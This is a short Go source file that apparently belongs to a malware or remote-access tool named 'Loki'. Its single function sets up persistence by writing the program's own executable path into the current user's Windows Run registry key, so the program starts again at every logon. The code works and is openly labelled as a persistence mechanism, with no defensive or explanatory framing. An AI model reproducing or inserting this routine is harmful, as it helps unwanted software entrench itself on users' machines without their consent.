package main

import (
	"golang.org/x/sys/windows/registry"
	"log"
	"os"
)

func setupPersistence() {
	log.Println(`Setting up persistence...`)

	exePath, err := os.Executable()
	if err != nil {
		log.Fatal(`Unable to get EXE path!`)
	}

	savedExePath, _, err := getRegistryValue(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`, `Loki`)
	if err != nil && err != registry.ErrNotExist {
		log.Fatal(`Unable to get registry value!`)
	}

	if savedExePath == exePath {
		log.Println(`Persistence is already set up!`)
		return
	}

	if err = setRegistryValue(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
		`Loki`, exePath); err != nil {
		log.Fatal(`Unable to save registry key!`)
	}

	log.Println(`Persistence set up successfully!`)
}
